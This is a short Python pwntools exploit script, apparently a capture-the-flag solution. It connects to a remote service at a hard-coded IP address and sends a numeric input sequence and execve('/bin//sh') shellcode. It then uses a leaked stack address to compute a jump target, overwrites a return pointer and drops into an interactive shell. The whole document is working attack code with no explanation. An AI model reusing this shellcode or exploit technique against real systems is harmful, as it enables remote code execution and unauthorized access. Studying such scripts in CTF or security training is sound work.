from pwn import *
import random

r = remote("35.201.132.60", 12001)

nop = "\x32\x2e"
nop2 = "\x34\x35"
nop3 = "\x32\x36"
nop4 = "\x32\x38"
rsi_zero = "\x31\xf6"

# \xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05
payload = "87\x5d"+nop3+"\x5d\xf7\xe6" + rsi_zero + "\x48\xbf\x2f\x62\x69\x6e126 \x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

r.sendline("183")
r.sendline("86")
r.sendline("177")
r.sendline("115")
r.sendline("193")
r.sendline("135")
r.sendline("186")
r.sendline("92")
r.sendline("49")
r.sendline("21")
r.sendline("162") # 11
r.send(payload)

r.recvuntil("126 ")
s = r.readline()[:8]
print "Stack: ", hex(u64(s.strip().ljust(8, "\x00")))

target = u64(s.strip().ljust(8, "\x00")) - 64 + 11 * 3 - 3
print "Target: ", hex(target)
r.send(p64(target) + "aaaa")
sleep(0.1)
r.interactive()
